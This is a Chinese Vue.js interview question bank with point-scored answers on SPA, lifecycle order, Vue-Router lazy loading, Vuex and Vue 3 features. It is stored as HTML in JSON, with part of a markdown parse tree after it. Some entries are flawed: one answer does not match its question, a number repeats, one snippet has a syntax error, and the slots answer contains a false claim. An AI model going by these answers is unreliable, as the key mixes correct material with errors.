与用户的交互，避免页面的重新加载。</p>\\n<p>优点：</p>\\n<ul>\\n<li><p>用户体验好、快，内容的改变不需要重新加载整个页面，避免了不必要的跳转和重复渲染；</p>\\n</li>\\n<li><p>基于上面一点，SPA 相对对服务器压力小；</p>\\n</li>\\n<li><p>前后端职责分离，架构清晰，前端进行交互逻辑，后端负责数据处理；</p>\\n</li>\\n</ul>\\n<p>缺点：</p>\\n<ul>\\n<li><p>初次加载耗时多：为实现单页 Web 应用功能及显示效果，需要在加载页面的时候将 JavaScript、CSS 统一加载，部分页面按需加载；</p>\\n</li>\\n<li><p>前进后退路由管理：由于单页应用在一个页面中显示所有的内容，所以不能使用浏览器的前进后退功能，所有的页面切换需要自己建立堆栈管理；</p>\\n</li>\\n<li><p>SEO 难度较大：由于所有的内容都在一个页面中动态替换显示，所以在 SEO 上其有着天然的弱势。</p>\\n</li>\\n</ul>\\n<h2>49. 对 SPA 单页面的理解，它的优缺点分别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>对于 runtime 来说，只需要保证组件存在 render 函数即可，而有了预编译之后，只需要保证构建过程中生成 render 函数就可以。在 webpack 中，使用vue-loader编译.vue文件，内部依赖的vue-template-compiler模块，在 webpack 构建过程中，将template预编译成 render 函数。与 react 类似，在添加了jsx的语法糖解析器babel-plugin-transform-vue-jsx之后，就可以直接手写render函数。</p>\\n<p>所以，template和jsx的都是render的一种表现形式，不同的是：JSX相对于template而言，具有更高的灵活性，在复杂的组件中，更具有优势，而 template 虽然显得有些呆滞。但是 template 在代码结构上更符合视图与逻辑分离的习惯，更简单、更直观、更好维护。</p>\\n<h2>50. Vue 子组件和父组件执行顺序</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>加载渲染过程：</p>\\n<ul>\\n<li><p>1.父 beforeCreate</p>\\n</li>\\n<li><p>2.父 created</p>\\n</li>\\n<li><p>3.父 beforeMount</p>\\n</li>\\n<li><p>4.子 beforeCreate</p>\\n</li>\\n<li><p>5.子 created</p>\\n</li>\\n<li><p>6.子 beforeMount</p>\\n</li>\\n<li><p>7.子 mounted</p>\\n</li>\\n<li><p>8.父 mounted</p>\\n</li>\\n</ul>\\n<p>更新过程：</p>\\n<ul>\\n<li><p>1.父 beforeUpdate</p>\\n</li>\\n<li><p>2.子 beforeUpdate</p>\\n</li>\\n<li><p>3.子 updated</p>\\n</li>\\n<li><p>4.父 updated</p>\\n</li>\\n</ul>\\n<h2>51. Vue-Router 的懒加载如何实现</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>加载渲染过程：</p>\\n<p>方案一(常用)：使用箭头函数+import动态加载</p>\\n<pre><code class=\\"language-js\\">  const List = () =&gt; import(&#39;@/components/list.vue&#39;)\\n  const router = new VueRouter({\\n    routes: [\\n      { path: &#39;/list&#39;, component: List }\\n    ]\\n  })\\n</code></pre>\\n<p>方案二：使用箭头函数+require动态加载</p>\\n<pre><code class=\\"language-js\\">const router = new Router({\\n  routes: [\\n   {\\n     path: &#39;/list&#39;,\\n     component: resolve =&gt; require([&#39;@/components/list&#39;], resolve)\\n   }\\n  ]\\n})\\n</code></pre>\\n<p>方案二：方案三：使用webpack的require.ensure技术，也可以实现按需加载。 这种情况下，多个路由指定相同的chunkName，会合并打包成一个js文件。</p>\\n<pre><code class=\\"language-js\\">// r就是resolve\\nconst List = r =&gt; require.ensure([], () =&gt; r(require(&#39;@/components/list&#39;)), &#39;list&#39;);\\n// 路由也是正常的写法  这种是官方推荐的写的 按模块划分懒加载 \\nconst router = new Router({\\n  routes: [\\n  {\\n    path: &#39;/list&#39;,\\n    component: List,\\n    name: &#39;list&#39;\\n  }\\n ]\\n}))\\n</code></pre>\\n<h2>52. $route 和$router 的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>$route 是“路由信息对象”，包括 path，params，hash，query，fullPath，matched，name 等路由信息参数</p>\\n<p>$router 是“路由实例”对象包括了路由的跳转方法，钩子函数等。</p>\\n<h2>53. Vuex和单纯的全局对象有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</p>\\n<p>不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用</p>\\n<h2>54. 为什么 Vuex 的 mutation 中不能做异步操作？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>Vuex中所有的状态更新的唯一途径都是mutation，异步操作通过 Action 来提交 mutation实现，这样可以方便地跟踪每一个状态的变化，从而能够实现一些工具帮助更好地了解我们的应用。</p>\\n<p>每个mutation执行完成后都会对应到一个新的状态变更，这样devtools就可以打个快照存下来，然后就可以实现 time-travel 了。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。</p>\\n<h2>55. Vuex的严格模式是什么,有什么作用，如何开启？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。</p>\\n<p>在Vuex.Store 构造器选项中开启,如下</p>\\n<pre><code class=\\"language-js\\">const store = new Vuex.Store({\\n  strict: true\\n})\\n</code></pre>\\n<h2>56. 如何在组件中批量使用Vuex的getter属性</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>如何在组件中批量使用Vuex的getter属性</p>\\n<p>使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中</p>\\n<pre><code class=\\"language-js\\">import {mapGetters} from &#39;vuex&#39;\\nexport default{\\n    computed:{\\n        ...mapGetters([&#39;total&#39;,&#39;discountTotal&#39;])\\n    }\\n}\\n</code></pre>\\n<h2>57. 如何在组件中重复使用Vuex的mutation</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>使用mapMutations辅助函数,在组件中这么使用</p>\\n<p>使用mapGetters辅助函数, 利用对象展开运算符将getter混入computed 对象中</p>\\n<pre><code class=\\"language-js\\">import { mapMutations } from &#39;vuex&#39;\\nmethods:{\\n    ...mapMutations({\\n        setNumber:&#39;SET_NUMBER&#39;,\\n    })\\n}\\n</code></pre>\\n<p>然后调用this.setNumber(10)相当调用this.$store.commit(&#39;SET_NUMBER&#39;,10)</p>\\n<h2>58. 为什么不建议用index作为key?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>使用index 作为 key和没写基本上没区别，因为不管数组的顺序怎么颠倒，index 都是 0, 1, 2...这样排列，导致 Vue 会复用错误的旧子节点，做很多额外的工作。</p>\\n<h2>59. 什么是Vue以及Vue的特点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。它的设计目标是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件。Vue 的特点包括但不限于：组件化开发，无需直接操作 DOM；使用虚拟 DOM 和 diff 算法复用 DOM 节点；提供简洁易用的模板语法.</p>\\n<h2>60. SPA及其优缺点是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>单页面应用（Single Page Application, SPA）指的是在网页加载完成后不会因为用户的操作而进行整个页面的重新加载，而是利用路由机制实现 HTML 内容的变化、UI 和用户的交互。优点在于提高了用户体验，减轻了服务器的压力，并且实现了前后端分离。然而，初次加载耗时较长，浏览器前进后退功能不可直接使用，SEO 优化难度较大.</p>\\n<h2>61. v-if 和 v-show 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>v-if 是真正的条件渲染，它会根据表达式的真假值来决定是否将元素添加到 DOM 中；而 v-show 则始终会渲染元素，只是通过 CSS 样式控制其可见性。因此，当条件频繁切换时，v-show 更高效，因为它避免了销毁和重建元素的过程。</p>\\n<h2>62. 如何动态绑定 class 和 style？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>在 Vue 中，可以通过对象或数组的形式动态绑定 class 和 style。对于 class，如果样式个数和名字不确定，则适合使用对象写法；若样式确定但是否应用不确定，则适用数组写法。例如：</p>\\n<pre><code class=\\"language-html\\">&lt;div :class=&quot;{ active: isActive, &#39;text-danger&#39;: hasError }&quot;&gt;&lt;/div&gt;\\n&lt;div :class=&quot;[isActive ? &#39;active&#39; : &#39;&#39;, errorClass]&quot;&gt;&lt;/div&gt;\\n&lt;div :style=&quot;{ color: activeColor, fontSize: fontSize + &#39;px&#39; }&quot;&gt;&lt;/div&gt;\\n&lt;div :style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<h2>63. Composition API 和 Options API 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Composition API 允许开发者以函数的方式组织逻辑，使得逻辑更加集中，便于理解和维护。相比之下，Options API 将逻辑分散在不同的生命周期钩子和选项中，虽然结构清晰但对于大型项目来说可能不够灵活。Composition API 提供了更好的类型推断支持，并且更适合与 TypeScript 结合使用.</p>\\n<h2>64. Vue 3 生命周期钩子有什么变化？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Vue 3 的生命周期钩子与 Vue 2 类似，但有一些细微差别。例如，beforeCreate 和 created 钩子被 setup() 函数取代，后者在组件实例创建之前执行。其他钩子名称也有所调整，如 beforeDestroy 变为 beforeUnmount，destroyed 变为 unmounted。</p>\\n<h2>65. Vue 3 的主要新特性是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Composition API：提供更灵活的代码组织方式。</p>\\n<p>性能优化：使用 Proxy 实现响应式，性能更好。</p>\\n<p>Tree-shaking：支持按需引入，减小打包体积。</p>\\n<p>TypeScript 支持：对 TypeScript 的支持更好。</p>\\n<p>Fragment、Teleport、Suspense：新增内置组件。</p>\\n<h2>66. 什么是 Composition API？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Composition API 是 Vue 3 引入的新特性，允许将逻辑组织为可复用的函数。</p>\\n<pre><code class=\\"language-js\\">\\nimport { ref, computed } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const count = ref(0); // 定义响应式数据\\n    const doubleCount = computed(() =&gt; count.value * 2); // 计算属性\\n\\n    function increment() {\\n      count.value++; // 定义方法\\n    }\\n\\n    return { count, doubleCount, increment }; // 返回模板使用的数据和方法\\n  }\\n};\\n</code></pre>\\n<h2>67. Vue 3 中的 toRef 和 toRefs 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>toRef：将对象的某个属性转换为 ref。</p>\\n<p>toRefs：将整个响应式对象的所有属性转换为 ref。</p>\\n<pre><code class=\\"language-js\\">\\nimport { reactive, toRef, toRefs } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const state = reactive({ name: &#39;Vue 3&#39;, age: 3 });\\n    const nameRef = toRef(state, &#39;name&#39;); // 单个属性\\n    const stateRefs = toRefs(state); // 所有属性\\n\\n    return { nameRef, stateRefs };\\n  }\\n};\\n</code></pre>\\n<h2>68. Vue 3 中的 provide 和 inject 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>provide 和 inject 用于跨层级组件通信。</p>\\n<pre><code class=\\"language-js\\">\\nimport { provide, ref } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const message = ref(&#39;Hello from parent&#39;);\\n    provide(&#39;message&#39;, message); // 提供数据\\n  }\\n};\\n\\n// 子组件\\nimport { inject } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const message = inject(&#39;message&#39;); // 注入数据\\n    return { message };\\n  }\\n};\\n</code></pre>\\n<h2>69. Vue 3 中的 Teleport 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Teleport 用于将组件渲染到指定 DOM 节点。</p>\\n<pre><code class=\\"language-js\\">\\n&lt;template&gt;\\n  &lt;teleport to=&quot;body&quot;&gt;\\n    &lt;div&gt;Modal&lt;/div&gt;\\n  &lt;/teleport&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<h2>70. Vue 3 中的 Suspense 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Suspense 用于处理异步组件的加载状态。</p>\\n<pre><code class=\\"language-js\\">\\n&lt;template&gt;\\n  &lt;Suspense&gt;\\n    &lt;template #default&gt;\\n      &lt;AsyncComponent /&gt;\\n    &lt;/template&gt;\\n    &lt;template #fallback&gt;\\n      &lt;p&gt;Loading...&lt;/p&gt;\\n    &lt;/template&gt;\\n  &lt;/Suspense&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<h2>71. Vue 3 中的 Fragment 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Fragment 允许组件返回多个根元素。</p>\\n<pre><code class=\\"language-js\\">\\n&lt;template&gt;\\n  &lt;div&gt;Hello&lt;/div&gt;\\n  &lt;div&gt;Vue 3&lt;/div&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<h2>72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>shallowRef：只对 .value 进行响应式处理。</p>\\n<p>shallowReactive：只对对象的第一层属性进行响应式处理。</p>\\n<pre><code class=\\"language-js\\">\\nimport { shallowRef, shallowReactive } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const count = shallowRef(0); // 基本类型\\n    const state = shallowReactive({ name: &#39;Vue 3&#39;, info: { age: 3 } }); // 对象类型\\n\\n    return { count, state };\\n  }\\n};\\n</code></pre>\\n<h2>73. Vue 3 中的 watch 如何监听多个数据？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>通过数组传入多个监听源。</p>\\n<pre><code class=\\"language-js\\">\\nimport { ref, watch } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    const count = ref(0);\\n    const name = ref(&#39;Vue 3&#39;);\\n\\n    watch([count, name], ([newCount, newName], [oldCount, oldName]) =&gt; {\\n      console.log(&#39;count 或 name 变化了&#39;);\\n    });\\n\\n    return { count, name };\\n  }\\n};\\n</code></pre>\\n<h2>74. Vue 3 中的 onRenderTracked 是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>onRenderTracked 是调试钩子，用于跟踪渲染依赖。</p>\\n<pre><code class=\\"language-js\\">\\nimport { onRenderTracked } from &#39;vue&#39;;\\n\\nexport default {\\n  setup() {\\n    onRenderTracked((event) =&gt; {\\n      console.log(&#39;跟踪到依赖:&#39;, event);\\n    });\\n  }\\n};\\n\\n</code></pre>\\n<h2>74. Pinia与 Vuex 有哪些不同？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>更符合 Composition API 思维模式</p>\\n<p>更好的 TypeScript 类型支持</p>\\n<h2>75. Vue 项目中如何实现多环境配置？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>可以使用 .env 文件来为不同环境配置变量。常见的环境文件包括：</p>\\n<p>env：默认的环境配置（用于开发环境或没有明确环境时）。</p>\\n<p>.env.development：开发环境配置。</p>\\n<p>.env.production：生产环境配置。</p>\\n<p>.env.test：测试环境配置。</p>\\n<h2>76. EventBus 与 mitt 区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。</p>\\n<p>如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：</p>\\n<p>非常小，压缩后仅有 200 bytes。</p>\\n<p>完整 TS 支持，源码由 TS 编码。</p>\\n<p>跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。</p>\\n<p>使用简单，仅有 on、emit、off 等少量实用API。</p>\\n<h2>77. v-if和v-for为什么不能连用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>v-for优先于v-if被解析，从源码中发现，先处理静态节点，在处理once，在处理for，在处理if，代码显示for的优先级比if高，断点调试也证实for优先于if。在vue3中v-if优先于v-for被解析。</p>\\n<p>如果同时使用，每次渲染都会先执行循环在判断条件，无论如何循环都避免不了，浪费了性能。</p>\\n<p>要避免出现这种情况，可以采用多层包裹来解决性能损耗问题。例如外层给标签绑定指令v-if或者是内层标签绑定v-if。</p>\\n<h2>78. mixin和mixis区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>mixin用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。比如：可以全局混入封装好的ajax或者一些工具函数等。</p>\\n<p>mixins用于单组件，是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过mixins混入代码。比如上拉下拉加载数据这种逻辑等。</p>\\n<h2>79. Vue 3的插槽（Slots）和Vue 2有何不同？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>Vue 3的插槽（Slots）与Vue 2相比有一些改进和变化。首先，Vue 3支持具名插槽和默认插槽的混合使用，这使得插槽的使用更加灵活。其次，Vue 3引入了作用域插槽（Scoped Slots），允许你在插槽中访问子组件的数据和方法。此外，Vue 3还改进了插槽的渲染和更新性能。</p>\\n","ast":[{"type":"heading","raw":"# Vue\\n\\n","depth":1,"text":"Vue","tokens":[{"type":"text","raw":"Vue","text":"Vue","escaped":false}]},{"type":"heading","raw":"## 1. vue3和vue2的区别\\n\\n","depth":2,"text":"1. vue3和vue2的区别","tokens":[{"type":"text","raw":"1. vue3和vue2的区别","text":"1. vue3和vue2的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（11 分）\\n\\n","depth":4,"text":"解答（11 分）","tokens":[{"type":"text","raw":"解答（11 分）","text":"解答（11 分）","escaped":false}]},{"type":"list","raw":"* **1：** 源码组织方式变化：使用 TS 重写\\n* **1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）\\n* **1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化\\n* **1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容\\n* **1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）\\n* **1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created\\n* **1：** Vue3 的 template 模板支持多个根标签\\n* **1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore\\n* **1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例\\n* **1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props\\n* **1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 源码组织方式变化：使用 TS 重写\\n","task":false,"loose":false,"text":"**1：** 源码组织方式变化：使用 TS 重写","tokens":[{"type":"text","raw":"**1：** 源码组织方式变化：使用 TS 重写","text":"**1：** 源码组织方式变化：使用 TS 重写","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 源码组织方式变化：使用 TS 重写","text":" 源码组织方式变化：使用 TS 重写","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）\\n","task":false,"loose":false,"text":"**1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","tokens":[{"type":"text","raw":"**1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","text":"**1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","text":" 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化\\n","task":false,"loose":false,"text":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","tokens":[{"type":"text","raw":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","text":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","text":" 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容\\n","task":false,"loose":false,"text":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","tokens":[{"type":"text","raw":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","text":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","text":" 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）\\n","task":false,"loose":false,"text":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","tokens":[{"type":"text","raw":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","text":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 打包体积优化：移除了一些不常用的api（inline-template、filter）","text":" 打包体积优化：移除了一些不常用的api（inline-template、filter）","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created\\n","task":false,"loose":false,"text":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","tokens":[{"type":"text","raw":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","text":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 生命周期的变化：使用setup代替了之前的beforeCreate和created","text":" 生命周期的变化：使用setup代替了之前的beforeCreate和created","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Vue3 的 template 模板支持多个根标签\\n","task":false,"loose":false,"text":"**1：** Vue3 的 template 模板支持多个根标签","tokens":[{"type":"text","raw":"**1：** Vue3 的 template 